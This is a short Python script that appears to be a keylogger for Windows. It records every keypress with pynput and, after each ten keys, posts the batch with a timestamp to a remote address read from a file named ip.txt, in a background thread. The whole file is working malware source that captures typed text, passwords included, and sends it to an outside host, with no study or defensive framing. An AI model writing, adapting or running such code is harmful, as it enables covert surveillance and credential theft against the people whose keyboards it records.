import pynput
from pynput import keyboard
from pynput.keyboard import Key, Listener
import logging
import win32event, win32api, winerror,win32console,win32gui
import requests
import datetime
import threading


virtual_keyboard={
	"96": "0",
	"97": "1",
	"98": "2",
	"99": "3",
	"100": "4",
	"101": "5",
	"102": "6",
	"103": "7",
	"104": "8",
	"105": "9"
}

keys=[]

ip_file="ip.txt"
ip_addr="127.0.0.1"

def request_task(url, data):
	print(data)
	requests.post(url, json=data)

def read_ip():
	f = open("ip.txt", "r")
	return f.read()

def fire_and_forget(url, json):
	print(datetime.datetime.utcnow().timestamp())
	print(json)
	threading.Thread(target=request_task, args=(url, json)).start()

def on_press(key):

	print(ip_addr)
	if hasattr(key, 'vk') and 96 <= key.vk <= 105:
		print(virtual_keyboard[str(key.vk)])
		keys.append(virtual_keyboard[str(key.vk)])
	
	else: 
		print(type(key))
		print(key)
		keys.append(str(key))

	if len(keys) >=10:
		print(keys)
		timestamp='{}'.format(datetime.datetime.utcnow().timestamp())
		fire_and_forget(ip_addr, {timestamp:keys[:]})
		keys.clear()

with Listener(on_press=on_press) as listener:
	ip_addr=read_ip()
	listener.join()